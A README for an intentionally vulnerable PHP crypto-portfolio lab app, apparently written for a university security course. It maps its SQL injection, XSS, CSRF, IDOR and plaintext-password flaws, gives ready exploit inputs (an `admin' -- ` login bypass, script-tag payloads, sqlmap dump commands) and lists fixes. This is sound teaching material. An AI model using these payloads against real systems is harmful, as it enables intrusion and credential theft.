# Crypto Portfolio Tracker — Deliberately Vulnerable Lab App

⚠️ **Intentionally insecure teaching artifact.** Built for a university
cybersecurity course. Runs **localhost only** on an isolated Kali lab machine.
**Never expose this to a network or the internet.** Every insecure code path is
marked in-source with `// VULN: <type> — intentional for coursework`.

## Stack
PHP 8.x (procedural) · MariaDB (`mysqli`) · Apache2 + `mod_php`. No framework,
no Composer, no build step.

## Run with Docker (no host install — recommended for dev)

From the repo root (the folder containing `docker-compose.yml`):

```bash
docker compose up --build -d      # build + start web (PHP/Apache) + db (MariaDB)
#  -> browse to http://localhost/crypto-tracker/

docker compose logs -f            # tail logs
docker compose down               # stop
docker compose down -v            # stop AND wipe the DB volume (fresh reseed next up)
```

- App is served at **http://localhost/crypto-tracker/** (port 80), so the
  `attacker/*.html` CSRF PoCs and all URLs work verbatim.
- `db.sql` auto-loads on the **first** boot only (fresh `dbdata` volume). To
  reseed after changing it: `docker compose down -v && docker compose up --build -d`.
- Port 80 already taken? Edit the `web` port mapping in `docker-compose.yml` to
  `"8080:80"`, browse to `http://localhost:8080/crypto-tracker/`, and update the
  `http://localhost/...` URLs inside `attacker/*.html` to include `:8080`.
- `config.php` reads DB settings from env vars (set by compose) with Kali
  defaults as fallback, so the exact same code also runs natively on Kali.

### sqlmap in a container (no host install)
A profile-gated `sqlmap` service runs on demand on the same network — reach the
app by service name `web`, and write evidence to `./sqlmap-output` on the host:
```bash
# search.php requires a login — grab a session first (via the SQLi bypass):
SID=$(curl -s -i -c - --data-urlencode "username=admin' -- " --data-urlencode "password=x" \
      http://localhost/crypto-tracker/login.php | awk '/PHPSESSID/{print $7}' | tr -d '\r')

docker compose run --rm sqlmap \
  -u "http://web/crypto-tracker/search.php?q=BTC" \
  --cookie="PHPSESSID=$SID" --output-dir=/output \
  --batch --dump -T users -D crypto_tracker
#  -> dumps plaintext passwords; CSV saved under ./sqlmap-output/
```
Prefer sqlmap on your host instead? It works unchanged against
`http://localhost/crypto-tracker/search.php?q=BTC`.

## Deploy on Kali (localhost)

```bash
# 1. Install LAMP (if needed)
sudo apt update
sudo apt install -y apache2 mariadb-server php php-mysqli libapache2-mod-php

# 2. Start services
sudo systemctl start apache2
sudo systemctl start mariadb

# 3. Deploy the app
sudo cp -r crypto-tracker /var/www/html/
sudo chown -R www-data:www-data /var/www/html/crypto-tracker

# 4. Load the database
sudo mariadb < /var/www/html/crypto-tracker/db.sql

# 5. Browse
#    http://localhost/crypto-tracker/
```

If your MariaDB `root` has a password, set `$DB_PASS` in `config.php`.

### Gotchas
- **Socket error** (`Can't connect through socket '/run/mysqld/mysqld.sock'`):
  `sudo systemctl status mariadb`; if the dir is missing,
  `sudo mkdir -p /run/mysqld && sudo chown mysql:mysql /run/mysqld` then restart.
- **`Call to undefined function mysqli_connect()`**: install `php-mysqli`,
  `sudo systemctl restart apache2`.
- **Browser downloads the `.php` file**: `sudo a2enmod php8.* && sudo systemctl restart apache2`.
- **Writes silently fail**: re-check the `chown www-data` step.

## Seed accounts (plaintext, on purpose)
| username | password  |
|----------|-----------|
| admin    | admin123  |
| alice    | password1 |
| bob      | qwerty    |

## Vulnerability map
| # | Vuln | Where | Quick exploit |
|---|------|-------|---------------|
| 1 | SQL Injection | `login.php`, `search.php`, register/add/edit | Login user `admin' -- ` (trailing space); UNION/sqlmap on `search.php?q=` |
| 2 | Stored XSS | `add_holding.php` notes, `profile.php` display name → rendered in `dashboard.php` | notes = `<script>alert(document.cookie)</script>` |
| 3 | Reflected XSS | `search.php` | `search.php?q=<script>alert('XSS')</script>` |
| 4 | CSRF | `add_holding.php`, `delete_holding.php` (GET), `profile.php` | open `attacker/csrf_delete.html` / `csrf_addpw.html` while logged in |
| 5 | IDOR | `dashboard.php`, `edit_holding.php`, `delete_holding.php` | `dashboard.php?user_id=2` as another user |
| 6 | Plaintext passwords | `register.php`, `profile.php`, `db.sql` | dump `users` via SQLi → readable creds |

### sqlmap (authenticated search endpoint)
Grab `PHPSESSID` from the browser after logging in, then:
```bash
sqlmap -u "http://localhost/crypto-tracker/search.php?q=BTC" \
       --cookie="PHPSESSID=<your-session-id>" --dbs --dump
```

## Exploitation checklist (screenshot each)
- [ ] SQLi auth bypass — log in as admin with a payload, no password
- [ ] SQLi dump — sqlmap enumerates DBs and dumps `users`
- [ ] Plaintext passwords — dumped table shows readable passwords
- [ ] Stored XSS — notes payload fires on dashboard load
- [ ] Reflected XSS — crafted search URL fires on load
- [ ] CSRF — attacker page silently deletes a holding / changes password
- [ ] IDOR — view another user's portfolio via `user_id`
- [ ] Chaining — SQLi → plaintext creds → account takeover

## Remediation (for the report's fix sections)
Prepared statements (`mysqli_prepare`/bound params) · `htmlspecialchars()` on all
output · per-form CSRF tokens + `SameSite=Lax/Strict` cookies · POST (not GET) for
state changes · ownership checks (`WHERE id = ? AND user_id = ?`) ·
`password_hash()` / `password_verify()`.
